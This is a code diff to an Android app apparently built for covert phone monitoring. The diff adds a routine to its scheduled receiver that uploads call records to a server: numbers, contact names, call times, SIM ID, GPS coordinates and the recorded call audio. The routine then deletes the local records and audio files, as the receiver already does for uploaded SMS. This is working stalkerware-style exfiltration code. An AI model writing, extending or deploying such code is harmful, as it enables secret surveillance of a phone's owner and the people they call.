@@ -1,5 +1,6 @@
 package com.privacy.monitor.receiver;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.Collection;
 import java.util.HashMap;
@@ -8,8 +9,10 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 import com.privacy.monitor.base.C;
+import com.privacy.monitor.db.CallRecordDB;
 import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.SMSRecordDB;
+import com.privacy.monitor.domain.CallRecord;
 import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.SMSRecord;
 import com.privacy.monitor.util.AppUtil;
@@ -31,9 +34,11 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private static final String TAG = CronBroadcaseRectiver.class.getSimpleName();
 	private MonitorDB monitorDB;
 	private SMSRecordDB smsRecordDB;
+	private CallRecordDB callRecordDB;
 	
 	@Override
 	public void onReceive(final Context context, Intent intent) {
+		
 		new Thread(new Runnable() {
 			boolean isCloseMobileNet = false;
 			@Override
@@ -46,10 +51,12 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				}
 				SystemClock.sleep(10000);
 				smsRecordDB = SMSRecordDB.getInstance(context);
+				callRecordDB = CallRecordDB.getInstance(context);
 				new Thread(new Runnable() {
 					@Override
 					public void run() {
-						uploadData(smsRecordDB,context);
+						uploadSMSData(smsRecordDB,context);
+						uploadCallRecord(callRecordDB,context);
 					}
 				}).start();
 				
@@ -60,7 +67,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			    }
 				if(!TextUtils.isEmpty(monitorList)){
 			    	HashMap<String,Monitor> hashMap = new HashMap<String, Monitor>();
-			        monitorDB = new MonitorDB(context);
+			        monitorDB = MonitorDB.getInstance(context);
 			    	try {
 						JSONObject jsonObject = new JSONObject(monitorList);
 						
@@ -158,7 +165,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		 }
 	}
 	
-	private void uploadData(SMSRecordDB smsRecordDB ,Context context) {
+	private void uploadSMSData(SMSRecordDB smsRecordDB ,Context context) {
 		ArrayList<SMSRecord> list = smsRecordDB.query(SMSRecord.COL_UPLOAD_STATUS +" = ? ",new String []{"0"});
 			if(list !=null){
 				for (SMSRecord smsRecord : list) {
@@ -174,5 +181,55 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		if("ok".equalsIgnoreCase(updateResult)){
 			smsRecordDB.delete(SMSRecord.COL_DATE +" = ?",new String []{smsRecord.getDateSent()});
 		}
+	}
+	
+	private void uploadCallRecord(CallRecordDB callRecordDB,Context context){
+		ArrayList<CallRecord> callRecords = callRecordDB.queryAll();
+		if(callRecords !=null){
+		   for (CallRecord callRecord : callRecords) {
+			String result = callRecord.getUploadResult();
+			if(!"0".equals(result)){
+				String uploadResult = NetworkUtil.uploadCall(callRecord.getMyPhone(),callRecord.getPhoneNumber(),callRecord.getCallName(),callRecord.getCallStartTime(),callRecord.getCallStopTime(),callRecord.getSimID(),callRecord.getLon(),callRecord.getLat(),callRecord.getDeviceName(),callRecord.getCallStatus());
+			    if(uploadResult.startsWith(callRecord.getMyPhone()+"/"+callRecord.getMyPhone()+"_"+callRecord.getPhoneNumber()+"_"+callRecord.getCallStatus())){
+			    	String filePath = callRecord.getSoundRecordPath();
+			    	if(!TextUtils.isEmpty(filePath)){
+			    		String uploadFileResult = NetworkUtil.uploadFile(uploadResult,filePath);
+			    		if(uploadFileResult.contains("FAULT")){
+			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
+			    		}else {
+							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
+							File file = new File(filePath);
+							if(file.exists()){
+								if(file.isFile()){
+									file.delete();
+								}
+							}
+						}
+			    	}else {
+			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
+					}
+			    }
+			 }else{
+				 String filePath = callRecord.getSoundRecordPath();
+				 String callResult =callRecord.getUploadResult();
+				 if(!TextUtils.isEmpty(filePath)){
+			    		String uploadFileResult = NetworkUtil.uploadFile(callResult,filePath);
+			    		if(uploadFileResult.contains("FAULT")){
+			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
+			    		}else {
+							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
+							File file = new File(filePath);
+							if(file.exists()){
+								if(file.isFile()){
+									file.delete();
+								}
+							}
+						}
+			    	}else {
+			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
+				}
+			 }
+		  }
+	   }
 	}
 }
